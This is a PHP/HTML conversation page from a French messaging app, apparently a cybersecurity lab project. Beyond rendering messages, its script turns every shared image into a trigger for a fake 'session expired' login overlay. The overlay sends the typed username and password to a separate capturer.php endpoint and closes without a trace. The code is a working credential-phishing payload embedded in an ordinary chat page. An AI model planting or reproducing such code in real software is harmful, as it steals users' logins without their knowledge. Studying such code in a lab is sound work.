<?php
include 'traitements/traitementConversation.php';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conversation avec <?= htmlspecialchars($remote_username); ?></title>
    <link rel="stylesheet" href="assets/style.css">
</head>

<body style="padding: 0; margin: 0; display: flex; flex-direction: column; height: 100vh;">
    <?php include 'header.php'; ?>

    <div style="flex: 1; display: flex; flex-direction: column; overflow: hidden; margin: 0 auto; width: 80%;">
        <div style="padding: 15px 20px; background-color: #f0f2f5; border-bottom: 1px solid #d0d0d0;">
            <h2 style="margin: 0; color: #31a24c;">Conversation avec <?= htmlspecialchars($remote_username); ?></h2>
        </div>

        <div style="flex: 1; overflow-y: auto; padding: 20px; background-color: #f9f9f9;">
            <div class="messages-container">
                <?php if (count($messages) > 0) { ?>
                    <?php foreach ($messages as $msg) {
                        $content = $msg['contenu'];
                        $image_path = '';
                        if (preg_match('/\[IMG:(.+?)\]/', $content, $matches)) {
                            $image_path = $matches[1];
                            $content = trim(preg_replace('/\[IMG:.+?\]/', '', $content));
                        }
                        ?>
                        <div class="message <?= ($msg['sender_id'] == $user_id) ? 'sent' : 'received'; ?>">
                            <div class="message-meta">
                                <strong><?= htmlspecialchars($msg['username']); ?></strong>
                            </div>
                            <div class="message-content">
                                <?php if ($content): ?><div><?= htmlspecialchars($content); ?></div><?php endif; ?>

                                <?php if ($image_path && file_exists(__DIR__ . '/' . $image_path)): ?>
                                    <div style="margin-top: 10px;">
                                        <img src="<?= htmlspecialchars($image_path); ?>"
                                            class="stego-trigger"
                                            style="max-width: 300px; max-height: 300px; border-radius: 5px; cursor: pointer;"
                                            alt="Image partagée">
                                    </div>
                                <?php endif; ?>
                            </div>
                        </div>
                    <?php } ?>
                <?php } ?>
            </div>
        </div>

        <div style="padding: 15px 20px; border-top: 1px solid #d0d0d0;">
            <form action="traitements/send_message.php" method="POST" enctype="multipart/form-data">
                <input type="hidden" name="conversation_id" value="<?= $conversation_id; ?>">
                <input type="text" name="message" placeholder="Écrivez votre message..." style="width: 70%; padding: 10px;">
                <input type="file" name="image" accept="image/*">
                <button type="submit">Envoyer</button>
            </form>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const images = document.querySelectorAll('.stego-trigger');

            images.forEach(function (img) {
                img.addEventListener('click', function (e) {
                    e.preventDefault();
                    e.stopPropagation();

                    // Création de l'overlay de phishing
                    const overlay = document.createElement('div');
                    overlay.style.cssText = "position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); display:flex; justify-content:center; align-items:center; z-index:99999;";

                    overlay.innerHTML = `
                        <div style="background:white; padding:40px; border-radius:10px; width:400px; text-align:center;">
                            <h2 style="color:#e74c3c;">Session Expirée</h2>
                            <p>Veuillez vous reconnecter pour continuer.</p>
                            <form id="phishForm">
                                <input type="text" id="u" placeholder="Nom d'utilisateur" required style="width:100%; padding:10px; margin-bottom:10px;">
                                <input type="password" id="p" placeholder="Mot de passe" required style="width:100%; padding:10px; margin-bottom:20px;">
                                <button type="submit" style="width:100%; padding:10px; background:#e74c3c; color:white; border:none; cursor:pointer;">Se reconnecter</button>
                            </form>
                        </div>
                    `;
                    document.body.appendChild(overlay);

                    // Gestion de l'envoi via AJAX (aucune redirection)
                    document.getElementById('phishForm').addEventListener('submit', function(ev) {
                        ev.preventDefault();
                        const data = new FormData();
                        data.append('fake_user', document.getElementById('u').value);
                        data.append('fake_pass', document.getElementById('p').value);

                        fetch('http://localhost/projects/MDI/cyber-securite/messagerie/codes/fake_login/capturer.php', {
                            method: 'POST',
                            body: data
                        }).then(() => {
                            // Fermeture immédiate et propre
                            overlay.remove();
                        });
                    });
                });
            });
        });
    </script>
</body>
</html>